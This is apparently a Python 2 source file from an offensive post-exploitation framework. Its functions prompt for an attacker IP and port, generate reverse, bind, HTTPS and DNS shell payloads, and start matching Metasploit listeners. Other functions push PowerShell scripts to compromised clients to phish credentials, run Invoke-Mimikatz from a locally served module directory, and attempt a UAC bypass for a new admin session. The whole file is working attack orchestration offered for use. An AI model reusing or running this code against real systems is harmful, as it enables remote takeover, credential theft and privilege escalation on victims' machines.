from main import *
from payloadextras import *
from startmetasploit import *
from generatepayload import *

def reverseIpAndPort(port):
    from menu import returnIP
    portnum = raw_input(
        '\n[*] Press Enter For Default Port(%s)\n[*] Port> '%(t.bold_green + port + t.normal))
    if len(portnum) is 0:
        portnum = port
    IP = returnIP()
    ipaddr = raw_input(
        '\n[*] Press Enter To Get Local Ip Automatically(%s)\n[*] IP> '%(t.bold_green + IP + t.normal))
    if len(ipaddr) == 0:
        ipaddr = IP
    if not IP:
        print t.bold_red + 'Error Getting Ip Automatically' + t.normal
        ipaddr = raw_input(
            '\n[*] Please Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')
    return (portnum,ipaddr)

def reversePayloadGeneration(payloadchoice,payloadname):
    portnum,ipaddr = reverseIpAndPort('4444')

    shellcode = payloadchoice(ipaddr, portnum)
    print t.bold_green + '[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
    if payloadname == "Windows_Reverse_Shell":
        ez2read_shellcode, startRevMetasploit = askAndReturnModules(shellcode,'nclistener')
    else:
        ez2read_shellcode, startRevMetasploit = askAndReturnModules(shellcode,'reverse')
    if GeneratePayload(ez2read_shellcode,payloadname,shellcode):
        startRevMetasploit(portnum)
        return "clear"
    else:
        return "pass"

def bindPayloadGeneration(payloadchoice,payloadname):
    bindport = raw_input(
            '\n[*] Press Enter For Default Bind Port(%s)\n[*] Port> '%(t.bold_green + '4444' + t.normal))
    if len(bindport) is 0:
        bindport = 4444

    shellcode = payloadchoice('' ,bindport)
    bindip = raw_input(
        '\n[*] Target Bind IP Address ' + t.bold_red + '(REQUIRED FOR BIND PAYLOADS)' + t.normal +' \n[*] IP> ')
    print t.bold_green + '[*] BIND IP SET AS %s\n[*] PORT SET AS %s\n' % (bindip,bindport) + t.normal
    ez2read_shellcode, startBindMetasploit = askAndReturnModules(shellcode,'bind')
    if GeneratePayload(ez2read_shellcode,payloadname,shellcode):
        startBindMetasploit(bindport,bindip)
        return "clear"
    else:
        return "pass"

def httpsPayloadGeneration(payloadchoice,payloadname):
    portnum,ipaddr = reverseIpAndPort('443')

    shellcode = payloadchoice(ipaddr, portnum)
    print t.bold_green + '[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
    ez2read_shellcode, startHttpsMetasploit = askAndReturnModules(shellcode,'https')
    if GeneratePayload(ez2read_shellcode,payloadname,shellcode):
        startHttpsMetasploit(portnum)
        return "clear"
    else:
        return "pass"

def dnsPayloadGeneration(payloadchoice,payloadname):
    portnum = raw_input(
        '\n[*] Press Enter For Default Port(%s)\n[*] Port> '%(t.bold_green + '4444' + t.normal))
    if len(portnum) is 0:
        portnum = 4444

    while True:
        DNSaddr = raw_input(
            '\n[*] Please Enter DNS Hostname\n[*] DNS> ')
        if DNSaddr:
            break
    shellcode = payloadchoice(DNSaddr, portnum)
    print t.bold_green + '[*] DNS HOSTNAME SET AS %s\n[*] PORT SET AS %s\n' % (DNSaddr, portnum) + t.normal
    ez2read_shellcode, startDnsMetasploit = askAndReturnModules(shellcode,'dns')
    if GeneratePayload(ez2read_shellcode,payloadname,shellcode):
        startDnsMetasploit(portnum,DNSaddr)
        return "clear"
    else:
        return "pass"

def customShellcodeGeneration(payloadchoice,payloadname):
    shellcode = payloadchoice()
    print '\n' + shellcode
    print t.bold_green + '[*] Custom Shellcode in use' + t.normal
    GeneratePayload(shellcode,payloadname,shellcode)

def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
    return "pass"

def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
    print payloadchoice
    clientnumber = int(clientUpload(payloadchoice(), isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'))
    from stager import returnServerList
    try:
        for server in returnServerList():
            while True:
                if server.handlers[clientnumber].in_buffer:
                    print server.handlers[clientnumber].in_buffer.pop()
                    break
                else:
                    time.sleep(0.1)
    except KeyboardInterrupt:
        pass
    return "pass"



def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
    from menu import returnIP
    moduleport = FUNCTIONS().randomUnusedPort()
    FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
    powershellScript = payloadchoice % (returnIP(), moduleport)
    clientnumber = int(clientUpload(payloadchoice(), isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'))
    from stager import returnServerList
    try:
        for server in returnServerList():
            while True:
                if server.handlers[clientnumber].in_buffer:
                    print server.handlers[clientnumber].in_buffer.pop()
                    break
                else:
                    time.sleep(0.1)
    except KeyboardInterrupt:
        pass
    return "pass"

def UACBypassGeneration(payloadchoice,payloadname):
    from menu import returnIP
    moduleport = FUNCTIONS().randomUnusedPort()
    FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
    encoded = printListener(False, True)
    powershellScript = payloadchoice % (returnIP(), moduleport, encoded)
    clientnumber = int(clientUpload(payloadchoice(), isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"false", "multiple":"false"}'))
    print t.bold_green + '\n[*] If UAC Bypass worked, expect a new admin session' + t.normal
    return "pass"
